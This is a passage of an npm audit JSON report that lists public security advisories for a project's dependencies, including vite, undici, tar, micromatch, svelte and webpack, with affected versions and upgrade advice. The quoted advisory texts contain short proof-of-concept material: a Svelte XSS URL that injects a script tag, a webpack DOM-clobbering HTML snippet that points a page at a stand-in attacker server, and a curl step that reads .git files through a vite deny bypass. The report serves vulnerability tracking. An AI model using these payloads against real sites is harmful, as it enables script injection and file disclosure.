      "title": "Vite's `server.fs.deny` did not deny requests for patterns with directories.",
      "metadata": null,
      "cves": [
        "CVE-2024-31207"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=5.1.0 <=5.1.6",
      "github_advisory_id": "GHSA-8jhw-289h-jh2g",
      "recommendation": "Upgrade to version 5.1.7 or later",
      "patched_versions": ">=5.1.7",
      "updated": "2024-04-04T20:24:28.000Z",
      "cvss": {
        "score": 5.9,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-8jhw-289h-jh2g"
    },
    "1096895": {
      "findings": [
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-8jhw-289h-jh2g\n- https://github.com/vitejs/vite/commit/011bbca350e447d1b499d242804ce62738c12bc0\n- https://github.com/vitejs/vite/commit/5a056dd2fc80dbafed033062fe6aaf4717309f48\n- https://github.com/vitejs/vite/commit/89c7c645f09d16a38f146ef4a1528f218e844d67\n- https://github.com/vitejs/vite/commit/96a7f3a41ef2f9351c46f3ab12489bb4efa03cc9\n- https://github.com/vitejs/vite/commit/ba5269cca81de3f5fbb0f49d58a1c55688043258\n- https://github.com/vitejs/vite/commit/d2db33f7d4b96750b35370c70dd2c35ec3b9b649\n- https://nvd.nist.gov/vuln/detail/CVE-2024-31207\n- https://github.com/advisories/GHSA-8jhw-289h-jh2g",
      "created": "2024-04-03T16:46:17.000Z",
      "id": 1096895,
      "npm_advisory_id": null,
      "overview": "### Summary\n[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` did not deny requests for patterns with directories. An example of such a pattern is `/foo/**/*`.\n\n### Impact\nOnly apps setting a custom `server.fs.deny` that includes a pattern with directories, and explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Patches\nFixed in vite@5.2.6, vite@5.1.7, vite@5.0.13, vite@4.5.3, vite@3.2.10, vite@2.9.18\n\n### Details\n`server.fs.deny` uses picomatch with the config of `{ matchBase: true }`. [matchBase](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=Description-,basename,-boolean) only matches the basename of the file, not the path due to a bug (https://github.com/micromatch/picomatch/issues/89). The vite config docs read like you should be able to set fs.deny to glob with picomatch. Vite also does not set `{ dot: true }` and that causes [dotfiles not to be denied](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=error%20is%20thrown.-,dot,-boolean) unless they are explicitly defined.\n\n**Reproduction**\n\nSet fs.deny to `['**/.git/**']` and then curl for `/.git/config`.\n\n* with `matchBase: true`, you can get any file under  `.git/` (config, HEAD, etc).\n* with `matchBase: false`, you cannot get any file under  `.git/` (config, HEAD, etc).\n",
      "reported_by": null,
      "title": "Vite's `server.fs.deny` did not deny requests for patterns with directories.",
      "metadata": null,
      "cves": [
        "CVE-2024-31207"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=4.0.0 <=4.5.2",
      "github_advisory_id": "GHSA-8jhw-289h-jh2g",
      "recommendation": "Upgrade to version 4.5.3 or later",
      "patched_versions": ">=4.5.3",
      "updated": "2024-04-04T20:24:28.000Z",
      "cvss": {
        "score": 5.9,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-8jhw-289h-jh2g"
    },
    "1097200": {
      "findings": [
        {
          "version": "5.28.3",
          "paths": [
            "packages__components>@elastic/elasticsearch>@elastic/transport>undici"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-9qxr-qj54-h672\n- https://github.com/nodejs/undici/commit/2b39440bd9ded841c93dd72138f3b1763ae26055\n- https://github.com/nodejs/undici/commit/d542b8cd39ec1ba303f038ea26098c3f355974f3\n- https://hackerone.com/reports/2377760\n- https://nvd.nist.gov/vuln/detail/CVE-2024-30261\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HQVHWAS6WDXXIU7F72XI55VZ2LTZUB33\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/P6Q4RGETHVYVHDIQGTJGU5AV6NJEI67E\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NC3V3HFZ5MOJRZDY5ZELL6REIRSPFROJ\n- https://github.com/advisories/GHSA-9qxr-qj54-h672",
      "created": "2024-04-04T14:20:54.000Z",
      "id": 1097200,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nIf an attacker can alter the `integrity` option passed to `fetch()`, they can let `fetch()` accept requests as valid even if they have been tampered.\n\n### Patches\n\nFixed in https://github.com/nodejs/undici/commit/d542b8cd39ec1ba303f038ea26098c3f355974f3.\nFixes has been released in v5.28.4 and v6.11.1.\n\n\n### Workarounds\n\nEnsure that `integrity` cannot be tampered with.\n\n### References\n\nhttps://hackerone.com/reports/2377760\n",
      "reported_by": null,
      "title": "Undici's fetch with integrity option is too lax when algorithm is specified but hash value is in incorrect",
      "metadata": null,
      "cves": [
        "CVE-2024-30261"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "undici",
      "vulnerable_versions": "<5.28.4",
      "github_advisory_id": "GHSA-9qxr-qj54-h672",
      "recommendation": "Upgrade to version 5.28.4 or later",
      "patched_versions": ">=5.28.4",
      "updated": "2024-04-29T05:02:11.000Z",
      "cvss": {
        "score": 2.6,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:N"
      },
      "cwe": [
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-9qxr-qj54-h672"
    },
    "1097493": {
      "findings": [
        {
          "version": "6.2.0",
          "paths": [
            ".>eslint-config-react-app>eslint-plugin-jest>jest>@jest/core>jest-config>jest-environment-jsdom>jsdom>canvas>@mapbox/node-pre-gyp>tar"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-f5x3-32g6-xq36\n- https://nvd.nist.gov/vuln/detail/CVE-2024-28863\n- https://github.com/isaacs/node-tar/commit/fe8cd57da5686f8695415414bda49206a545f7f7\n- https://security.netapp.com/advisory/ntap-20240524-0005\n- https://github.com/advisories/GHSA-f5x3-32g6-xq36",
      "created": "2024-03-22T16:57:05.000Z",
      "id": 1097493,
      "npm_advisory_id": null,
      "overview": "## Description: \nDuring some analysis today on npm's `node-tar` package I came across the folder creation process, Basicly if you provide node-tar with a path like this `./a/b/c/foo.txt` it would create every folder and sub-folder here a, b and c until it reaches the last folder to create `foo.txt`, In-this case I noticed that there's no validation at all on the amount of folders being created, that said we're actually able to CPU and memory consume the system running node-tar and even crash the nodejs client within few seconds of running it using a path with too many sub-folders inside\n\n## Steps To Reproduce:\nYou can reproduce this issue by downloading the tar file I provided in the resources and using node-tar to extract it, you should get the same behavior as the video\n\n## Proof Of Concept:\nHere's a [video](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3i7uojw8s52psar6pg8zkdo4h9io?response-content-disposition=attachment%3B%20filename%3D%22tar-dos-poc.webm%22%3B%20filename%2A%3DUTF-8%27%27tar-dos-poc.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1e8235d885f1d61529b7d6b23ea3a0780c300c91d86e925dd8310d5b661ddbe2) show-casing the exploit: \n\n## Impact\n\nDenial of service by crashing the nodejs client when attempting to parse a tar archive, make it run out of heap memory and consuming server CPU and memory resources\n\n## Report resources\n[payload.txt](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1e83ayb5dd3350fvj3gst0mqixwk?response-content-disposition=attachment%3B%20filename%3D%22payload.txt%22%3B%20filename%2A%3DUTF-8%27%27payload.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bad9fe731f05a63a950f99828125653a8c1254750fe0ca7be882e89ecdd449ae)\n[archeive.tar.gz](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ymkuh4xnfdcf1soeyi7jc2x4yt2i?response-content-disposition=attachment%3B%20filename%3D%22archive.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27archive.tar.gz&response-content-type=application%2Fx-tar&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5e2c0d4b4de40373ac0fe91908c2659141a6dd4ab850271cc26042a3885c82ea)\n\n## Note\nThis report was originally reported to GitHub bug bounty program, they asked me to report it to you a month ago",
      "reported_by": null,
      "title": "Denial of service while parsing a tar file due to lack of folders count validation",
      "metadata": null,
      "cves": [
        "CVE-2024-28863"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "tar",
      "vulnerable_versions": "<6.2.1",
      "github_advisory_id": "GHSA-f5x3-32g6-xq36",
      "recommendation": "Upgrade to version 6.2.1 or later",
      "patched_versions": ">=6.2.1",
      "updated": "2024-06-10T18:30:53.000Z",
      "cvss": {
        "score": 6.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-400"
      ],
      "url": "https://github.com/advisories/GHSA-f5x3-32g6-xq36"
    },
    "1098681": {
      "findings": [
        {
          "version": "4.0.5",
          "paths": [
            ".>lint-staged>micromatch"
          ]
        },
        {
          "version": "3.1.10",
          "paths": [
            "packages__components>gulp>glob-watcher>anymatch>micromatch"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-4067\n- https://github.com/micromatch/micromatch/issues/243\n- https://github.com/micromatch/micromatch/pull/247\n- https://devhub.checkmarx.com/cve-details/CVE-2024-4067\n- https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448\n- https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0\n- https://github.com/micromatch/micromatch/pull/266\n- https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade\n- https://advisory.checkmarx.net/advisory/CVE-2024-4067\n- https://github.com/micromatch/micromatch/releases/tag/4.0.8\n- https://github.com/advisories/GHSA-952p-6rrq-rcjv",
      "created": "2024-05-14T18:30:54.000Z",
      "id": 1098681,
      "npm_advisory_id": null,
      "overview": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",
      "reported_by": null,
      "title": "Regular Expression Denial of Service (ReDoS) in micromatch",
      "metadata": null,
      "cves": [
        "CVE-2024-4067"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "micromatch",
      "vulnerable_versions": "<4.0.8",
      "github_advisory_id": "GHSA-952p-6rrq-rcjv",
      "recommendation": "Upgrade to version 4.0.8 or later",
      "patched_versions": ">=4.0.8",
      "updated": "2024-08-28T13:12:27.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
      },
      "cwe": [
        "CWE-1333"
      ],
      "url": "https://github.com/advisories/GHSA-952p-6rrq-rcjv"
    },
    "1098725": {
      "findings": [
        {
          "version": "4.2.18",
          "paths": [
            "packages__components>@stripe/agent-toolkit>ai>svelte"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-8266-84wp-wv5c\n- https://github.com/sveltejs/svelte/commit/83e96e044deb5ecbae2af361ae9e31d3e1ac43a3\n- https://nvd.nist.gov/vuln/detail/CVE-2024-45047\n- https://github.com/advisories/GHSA-8266-84wp-wv5c",
      "created": "2024-08-30T16:49:10.000Z",
      "id": 1098725,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nA potential XSS vulnerability exists in Svelte for versions prior to 4.2.19.\n\n### Details\n\nSvelte improperly escapes HTML on server-side rendering. It converts strings according to the following rules:\n\n- If the string is an attribute value:\n    - `\"` -> `&quot;`\n    - `&` -> `&amp;`\n    - Other characters -> No conversion\n- Otherwise:\n    - `<` -> `&lt;`\n    - `&` -> `&amp;`\n    - Other characters -> No conversion\n\nThe assumption is that attributes will always stay as such, but in some situation the final DOM tree rendered on browsers is different from what Svelte expects on server-side rendering. This may be leveraged to perform XSS attacks. More specifically, this can occur when injecting malicious content into an attribute within a `<noscript>` tag.\n\n### PoC\n\nA vulnerable page (`+page.svelte`):\n```html\n<script>\nimport { page } from \"$app/stores\"\n\n// user input\nlet href = $page.url.searchParams.get(\"href\") ?? \"https://example.com\";\n</script>\n\n<noscript>\n  <a href={href}>test</a>\n</noscript>\n```\n\nIf a user accesses the following URL,\n```\nhttp://localhost:4173/?href=</noscript><script>alert(123)</script>\n```\nthen, `alert(123)` will be executed.\n\n### Impact\n\nXSS, when using an attribute within a noscript tag",
      "reported_by": null,
      "title": "Svelte has a potential mXSS vulnerability due to improper HTML escaping",
      "metadata": null,
      "cves": [
        "CVE-2024-45047"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "svelte",
      "vulnerable_versions": "<4.2.19",
      "github_advisory_id": "GHSA-8266-84wp-wv5c",
      "recommendation": "Upgrade to version 4.2.19 or later",
      "patched_versions": ">=4.2.19",
      "updated": "2024-08-30T20:01:24.000Z",
      "cvss": {
        "score": 5.4,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
      },
      "cwe": [
        "CWE-79"
      ],
      "url": "https://github.com/advisories/GHSA-8266-84wp-wv5c"
    },
    "1099351": {
      "findings": [
        {
          "version": "5.90.3",
          "paths": [
            "packages__ui>react-scripts>webpack"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986\n- https://nvd.nist.gov/vuln/detail/CVE-2024-43788\n- https://github.com/webpack/webpack/commit/955e057abc6cc83cbc3fa1e1ef67a49758bf5a61\n- https://research.securitum.com/xss-in-amp4email-dom-clobbering\n- https://scnps.co/papers/sp23_domclob.pdf\n- https://github.com/webpack/webpack/issues/18718#issuecomment-2326296270\n- https://github.com/advisories/GHSA-4vvj-4cpr-p986",
      "created": "2024-08-27T19:50:40.000Z",
      "id": 1099351,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in WebpackÔÇÖs `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nWe found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If WebpackÔÇÖs code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.\n\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n\n#### Gadgets found in Webpack\n\nWe identified a DOM Clobbering vulnerability in WebpackÔÇÖs `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() => {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl && document) {\n/******/ \t\t\tif (document.currentScript)\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\?.*$/, \"\").replace(/\\/[^\\/]+$/, \"/\");\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nHowever, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.\n\n### PoC\n\nPlease note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, IÔÇÖm providing a demo to illustrate the concept.\n\nConsider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:\n\n```\n// entry.js\nimport('./import1.js')\n  .then(module => {\n    module.hello();\n  })\n  .catch(err => {\n    console.error('Failed to load module', err);\n  });\n```\n\n```\n// import1.js\nexport function hello () {\n  console.log('Hello');\n}\n```\n\nThe webpack.config.js is set up as follows:\n```\nconst path = require('path');\n\nmodule.exports = {\n  entry: './entry.js', // Ensure the correct path to your entry file\n  output: {\n    filename: 'webpack-gadgets.bundle.js', // Output bundle file\n    path: path.resolve(__dirname, 'dist'), // Output directory\n    publicPath: \"auto\", // Or leave this field not set\n  },\n  target: 'web',\n  mode: 'development',\n};\n```\n\nWhen the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Webpack Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script src=\"./dist/webpack-gadgets.bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.\n\n### Patch\n\nA possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() => {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl && document) {\n/******/ \t\t\tif (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :>\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to 